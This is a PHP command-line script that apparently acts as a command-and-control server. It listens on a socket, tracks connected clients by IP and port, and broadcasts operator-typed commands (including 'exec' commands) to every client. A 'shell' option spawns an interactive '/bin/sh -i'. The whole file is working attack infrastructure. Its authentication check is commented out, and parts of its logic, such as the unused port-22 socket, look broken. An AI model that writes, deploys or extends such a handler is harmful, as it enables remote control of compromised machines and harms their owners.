#!/usr/local/bin/php -q
<?php
	set_time_limit(0);
	ob_implicit_flush(1);
	if($argc<3){
		die("Assign host addr and port\n");
	}
	
	/*************************	auth. ****************************/
	//require_once './serverlogin.php';
	//if(!calllogin()) die("Login failed");
	/**********************	end of auth. *************************/

	$host_addr 		= trim($argv[1]);
	$host_port 		= trim($argv[2]);
	$arg 			= (($argc-1) === 3) ? $argv[3] : '';
	if (($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false){
	    echo "\33[91m[!] socket_create() failed: reason: ".socket_strerror(socket_last_error())."\33[0m\n";
	}
	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);
	if (socket_bind($master_sock, $host_addr, $host_port) === false){
	    echo "\33[91m[!] socket_bind() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n";
	}
	if (socket_listen($master_sock) === false){
	    echo "\33[91m[!] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n";
	}
	
	echo "\33[36mHost [".$host_addr.":".$host_port."] listening for incomming connections..\33[0m\n\n";
	
	$clients = array($master_sock);
	$cstm = array();
	
	while (true) {
	       
	    // create a copy, so $clients doesn't get modified by socket_select()
		$write = $recv = $clients;

		$except = NULL;
		$now = date('H:i:s');
	    if(socket_select($recv, $write, $except, NULL) === false)
	    {
	    	die("\33[91m[!] socket_select() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
	    }
	    if(in_array($master_sock, $recv))
	    {
			if (($clients[] = $recv_sock = socket_accept($master_sock)) === false)
			{
		        die("\33[91m[!] socket_accept() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
		    }
			socket_getpeername($recv_sock, $ip, $port);
		    echo "[".$now."] \33[32mClient connected on IP: [".$ip.":".$port."]\33[0m\n";

		    $cstm [] =  array("ip" => $ip, "port" => $port);

	        // remove the listening socket from the clients-with-data array
	        $key = array_search($clients, $recv);
	        unset($recv[$key]);

	        continue;
	    }

	    $len = count($clients)-1;	// clients minus master socket
	    $len2 = count($cstm);	// number of all clients (ip:port)

	    foreach ($recv as $recv_sock)
	    {
	    	socket_getpeername($recv_sock, $ip, $port);
			$now = date('H:i:s');
	        
	        if (($data = @socket_read($recv_sock, 4096, PHP_BINARY_READ)) === false || $data === "")
	        {
	            $key = array_search($recv_sock, $clients);
	            
	            unset($clients[$key]);
	            unset($recv[$key]);
	            unset($write[$key]);
				
	            $_key = array_search($port, array_map(function($v){return $v['port'];},$cstm)); // u realnom svetu - IP umjesto porta
	            unset($cstm[$_key]);
	            
	            echo "[".$now."] \33[38;5;208mClient ".$ip.":".$port." disconnected.\33[0m\n";
	            continue;
	        }
 
          	$data = trim($data);

    
	        if(!empty($data))
		    	echo "Client [\33[95m".$ip.":".$port."\33[0m] :".$data."\n";

		    if($len2 == $len)
		    	$line = "";	// empty line when data is recieved from all clients
		}
	

    	if(@preg_match('/^(exec)\s\w+/', $line)){
    		sleep(1);	// wait 1 sec until client/s send result
    		continue;
    	}
    	else{
			$line = readline(">>> ");
    		readline_add_history($line);
    	}



	    switch ($line) {
	    	case 'clients':
	    		echo "\33[95mClients: ".(count($clients)-1)."\33[0m\n";
	    		print_r($cstm);
	    		break;
	    	case 'exit':
				echo "Closing master socket..\n";
				socket_close($master_sock);	
				exit();
			case 'shell':
				$sock = fsockopen("$host_addr", 22);
				exec("/bin/sh -i >> ./shellout.txt");
				break;
	    	default:
	    		break;
	    }



	    if(!empty($line) && $line != 'clients' && $line != 'exit')
	    {
		  	foreach ($write as $send_sock) {
		        if ($send_sock == $master_sock)
		            continue;
		        else if(@socket_write($send_sock, $line."\n") === false){	
		        	echo "\33[91mWrite error: ".socket_strerror(socket_last_error($send_sock))."\33[0m\n";
		        }	
		    }
		}
		if(count($clients) === 1)
		{
			echo "\33[38;5;208mNo connected clients..\33[0m\nListening..\n"; 
		}

	}
	echo "Closing master socket..\n";
	socket_close($master_sock);
	exit(0);
?>
